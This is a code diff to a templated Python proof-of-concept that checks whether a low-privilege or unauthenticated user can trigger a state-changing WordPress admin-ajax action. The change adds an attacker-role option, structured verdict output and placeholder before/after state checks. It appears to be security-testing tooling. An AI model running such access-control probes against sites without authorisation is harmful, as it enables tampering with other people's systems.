@@ -1,16 +1,25 @@
 import requests
 from wp_login import wp_login
+from poc_result import emit_result
 
 TARGET = "{{ target_url }}"
 ACTION = "{{ ajax_action }}"
 USERNAME = "{{ test_username }}"
 PASSWORD = "{{ test_password }}"
+ATTACKER_ROLE = "{{ attacker_role }}"
 
 session = requests.Session()
-login = wp_login(session, TARGET, USERNAME, PASSWORD)
-if not login.success:
-    print(f"[-] FAILURE: login failed for {USERNAME}: {login.reason}")
-    raise SystemExit(0)
+if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
+    login = wp_login(session, TARGET, USERNAME, PASSWORD)
+    if not login.success:
+        emit_result(
+            verdict="not_vulnerable", oracle="state_change", attacker_role=ATTACKER_ROLE,
+            request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
+            attack={"observed": False, "before": None, "after": None},
+            control={"observed": True, "before": None, "after": None},
+            impact="Authentication failed before state could be tested.",
+        )
+        raise SystemExit(0)
 
 marker = "squadrone_marker"
 resp = session.post(
@@ -25,11 +34,20 @@ resp = session.post(
     timeout=20,
 )
 
-body = resp.text[:700]
-blocked = any(marker in body.lower() for marker in ("forbidden", "unauthorized", "not allowed", "-1", "nonce"))
-if resp.status_code in (200, 201, 204) and not blocked:
-    print(f"[+] SUCCESS: low-privilege request to {ACTION} was accepted")
-    print(f"    status={resp.status_code} body={body[:400]}")
-else:
-    print(f"[-] FAILURE: state-changing request rejected or inconclusive")
-    print(f"    status={resp.status_code} body={body[:400]}")
+# Replace these placeholders with reads of the protected state before and after
+# the real request. HTTP acceptance alone is not a state-change oracle.
+before_state = None
+after_state = None
+control_before = None
+control_after = None
+observed = before_state != after_state and control_before == control_after
+emit_result(
+    verdict="vulnerable" if observed else "not_vulnerable",
+    oracle="state_change",
+    attacker_role=ATTACKER_ROLE,
+    request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
+    attack={"observed": observed, "before": before_state, "after": after_state},
+    control={"observed": False if observed else True, "before": control_before, "after": control_after},
+    integrity="high" if observed else "none",
+    impact="The low-privilege request changed protected plugin state." if observed else "No protected state change was measured.",
+)
